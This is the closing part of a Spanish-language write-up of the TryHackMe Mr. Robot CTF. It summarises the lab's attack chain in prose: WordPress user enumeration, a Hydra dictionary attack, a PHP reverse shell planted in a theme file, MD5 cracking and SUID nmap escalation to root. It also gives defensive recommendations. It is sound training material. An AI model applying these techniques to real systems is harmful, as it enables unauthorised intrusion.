
Finalmente, se obtuvo la tercera clave del laboratorio, completando la escalada de privilegios.

### Conocimientos adquiridos

- Enumeración de directorios y usuarios de Linux.
- Identificación de archivos con hashes de contraseñas.
- Funcionamiento básico del algoritmo MD5.
- Recuperación de contraseñas mediante John the Ripper.
- Uso de diccionarios optimizados.
- Mejora de shells mediante pseudoterminales de Python.
- Cambio de usuarios mediante `su`.
- Enumeración de binarios SUID.
- Interpretación de permisos especiales de Linux.
- Investigación de técnicas mediante GTFOBins.
- Identificación de configuraciones inseguras en Nmap.
- Escalada de privilegios hasta root.

---

## 6. Conclusiones y recomendaciones

### Conclusiones

Durante la resolución de Mr. Robot CTF de TryHackMe se aplicaron técnicas de reconocimiento, enumeración, explotación y escalada de privilegios sobre una máquina Linux vulnerable.

Inicialmente, mediante Nmap, se identificaron tres puertos TCP abiertos correspondientes a los servicios SSH, HTTP y HTTPS.

La enumeración web con Gobuster permitió descubrir diferentes rutas relacionadas con WordPress, mientras que el análisis del archivo `robots.txt` reveló los recursos `fsocity.dic` y `key-1-of-3.txt`, lo que permitió obtener la primera clave del laboratorio.

Posteriormente, se investigó el formulario de autenticación de WordPress mediante WPScan y Burp Suite. Se identificó que la aplicación revelaba información sobre la existencia de usuarios a través de mensajes de error diferenciados.

Utilizando Hydra y el diccionario preparado durante la enumeración, se identificaron credenciales válidas que permitieron acceder al panel administrativo de WordPress.

Desde el editor de temas se modificó el archivo `archive.php`, incorporando una reverse shell PHP obtenida del repositorio de pentestmonkey. Esto permitió establecer una conexión hacia Kali Linux y obtener acceso inicial al sistema con el usuario `daemon`.

Durante la enumeración local se identificó el archivo `password.raw-md5` dentro del directorio del usuario `robot`. Se analizó su hash mediante John the Ripper y posteriormente se consiguió acceder a dicho usuario, obteniendo la segunda clave.

Finalmente, mediante la enumeración de binarios SUID, se identificó una configuración insegura en `/usr/local/bin/nmap`. Con ayuda de GTFOBins se investigó su modo interactivo y se aprovechó para ejecutar una shell con privilegios de root.

De esta manera, se obtuvo la tercera clave y se completaron los objetivos del laboratorio.

### Vulnerabilidades y configuraciones inseguras identificadas

| Hallazgo | Riesgo identificado |
|---|---|
| Exposición de archivos mediante robots.txt | Divulgación de información y recursos útiles para un atacante |
| Enumeración de usuarios en WordPress | Identificación de cuentas mediante mensajes de autenticación |
| Credenciales susceptibles a ataques de diccionario | Acceso no autorizado a cuentas |
| Edición de archivos PHP desde WordPress | Posibilidad de ejecución remota de código con una cuenta comprometida |
| Exposición de un hash MD5 de contraseña | Riesgo de recuperación de credenciales mediante ataques offline |
| Permisos SUID inseguros en Nmap | Escalada de privilegios hasta root |

### Recomendaciones de seguridad

**1. Evitar la exposición innecesaria de información**

Se recomienda revisar los archivos accesibles desde el servidor web y evitar almacenar información sensible o recursos internos en directorios públicos.

El archivo `robots.txt` no debe utilizarse como mecanismo de protección, ya que su contenido puede ser consultado por cualquier visitante.

**2. Fortalecer la autenticación de WordPress**

Se recomienda implementar contraseñas robustas, autenticación multifactor y mecanismos de limitación de intentos de inicio de sesión.

También es recomendable utilizar mensajes de error genéricos para evitar revelar si una cuenta existe.

**3. Restringir la edición de archivos desde WordPress**

Se recomienda limitar los permisos de las cuentas administrativas y deshabilitar la edición de archivos desde el panel cuando no sea necesaria.

En WordPress puede utilizarse la siguiente configuración:

```php
define('DISALLOW_FILE_EDIT', true);
```

Esta medida reduce el riesgo de modificar archivos PHP desde el panel administrativo, aunque debe complementarse con controles adecuados sobre el sistema de archivos.

**4. Proteger el almacenamiento de contraseñas**

Se debe evitar utilizar algoritmos de hash rápidos como MD5 para almacenar contraseñas.

Es recomendable utilizar algoritmos diseñados específicamente para contraseñas, como Argon2id, bcrypt o scrypt, con configuraciones adecuadas.

También deben restringirse los permisos de lectura sobre archivos que contengan información de autenticación.

**5. Auditar los permisos SUID**

Se recomienda revisar periódicamente los ejecutables que tienen habilitado el bit SUID.

Los programas que permiten ejecutar comandos del sistema, como determinadas versiones antiguas de Nmap, no deben tener privilegios SUID innecesarios.

**6. Mantener los sistemas y aplicaciones actualizados**

Se recomienda mantener WordPress, sus temas, plugins y los componentes del sistema operativo con actualizaciones de seguridad vigentes.

Asimismo, deben eliminarse herramientas y servicios innecesarios para reducir la superficie de ataque.

### Conocimientos adquiridos

La resolución de Mr. Robot CTF permitió reforzar conocimientos prácticos relacionados con:

- Reconocimiento de redes y enumeración de servicios mediante Nmap.
- Descubrimiento de directorios y archivos con Gobuster.
- Identificación y análisis de aplicaciones WordPress.
- Análisis de solicitudes HTTP mediante Burp Suite.
- Enumeración de usuarios y evaluación de mecanismos de autenticación.
- Uso de Hydra para pruebas de diccionario.
- Identificación y análisis de hashes MD5 mediante John the Ripper.
- Funcionamiento de reverse shells PHP.
- Uso de Netcat para recibir conexiones remotas.
- Enumeración de usuarios y archivos en Linux.
- Mejora de shells interactivas utilizando Python.
- Interpretación de permisos especiales SUID.
- Investigación de técnicas de escalada mediante GTFOBins.
- Escalada de privilegios hasta root.
- Documentación técnica de pruebas de penetración.

### Resultado final

**Máquina:** Mr. Robot CTF

**Plataforma:** TryHackMe

**Sistema operativo:** Linux

**Acceso inicial:** Usuario daemon

**Acceso posterior:** Usuario robot

**Escalada de privilegios:** SUID en /usr/local/bin/nmap

**Claves obtenidas:**

- key-1-of-3.txt
- key-2-of-3.txt
- key-3-of-3.txt

**Estado:** Completado

---

### Referencias

- [TryHackMe — Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
- [Nmap — Documentación oficial](https://nmap.org/book/man.html)
- [WPScan](https://wpscan.com/)
- [John the Ripper](https://www.openwall.com/john/)
- [PHP Reverse Shell — pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
- [GTFOBins — Nmap](https://gtfobins.github.io/gtfobins/nmap/)
